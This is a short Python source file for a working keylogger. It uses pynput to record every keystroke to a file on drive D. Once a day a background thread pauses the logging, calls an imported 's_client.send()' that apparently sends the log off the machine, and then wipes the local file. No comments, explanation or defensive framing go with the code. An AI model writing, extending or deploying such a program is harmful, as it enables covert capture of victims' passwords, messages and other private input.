from pynput import keyboard
import time
import threading
import s_client

filepath = r"D:\key_logs.txt"
pause_event = threading.Event()

def on_press(key):
    pause_event.wait()
    with open(filepath, "a") as log_file:
        log_file.write(f"Key pressed: {key}\n")

def start_keylogger():
    pause_event.set()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def schedule_task():
    while True:
        time.sleep(86400)

        pause_event.clear()
        s_client.send()
        with open(filepath, "w") as log_file:
            log_file.truncate(0)
        pause_event.set()

def main():
    scheduler_thread = threading.Thread(target=schedule_task, daemon=True)
    scheduler_thread.start()
    start_keylogger()

if __name__ == "__main__":
    main()